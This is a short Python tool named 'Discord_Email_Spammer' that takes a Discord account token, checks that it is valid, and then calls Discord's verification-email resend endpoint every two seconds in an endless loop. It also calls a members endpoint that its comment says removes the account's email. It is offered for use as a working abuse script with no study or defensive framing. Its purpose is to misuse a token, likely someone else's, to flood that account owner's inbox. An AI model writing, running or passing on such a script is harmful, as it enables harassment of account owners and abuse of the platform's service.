import requests, sys
from time import sleep
from colorama import Fore, init

class Discord_Email_Spammer:
    def __init__(self, token):
        self.token = token
        self.headers = {"authorization": self.token, "user-agent": "Mozilla/5.0"}

    def remove_token_email(self):
        #remove the mail
        requests.get(
            "https://canary.discordapp.com/api/v8/guilds/0/members", 
            headers=self.headers
        )

    def resend_verification_email(self):
        #send the verification email
        r = requests.post(
            "https://discord.com/api/v8/auth/verify/resend", 
            headers=self.headers
        )
        if r.status_code == 204:
            print(f"{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.RESET} Email sent!")
        else:
            print(f"{Fore.RED}[{Fore.GREEN}!{Fore.RED}]{Fore.RESET} Ratelimited!")

    def spam_token_email(self):
        self.remove_token_email()
        while True:
            sleep(2)
            self.resend_verification_email()

def main():
    if len(sys.argv) < 2:
        sys.exit()
    token = sys.argv[1]
    r = requests.get('https://discord.com/api/v9/users/@me', headers={"authorization": token})
    if r.status_code == 200:
        #it is a valid token
        pass
    else:
        #token is invalid
        print(f"{Fore.RED}[{Fore.RED}?{Fore.RED}]{Fore.RESET} Invalid Token!")
        sys.exit()
    Discord_Email_Spammer(token).spam_token_email()

if __name__ == '__main__':
    main()
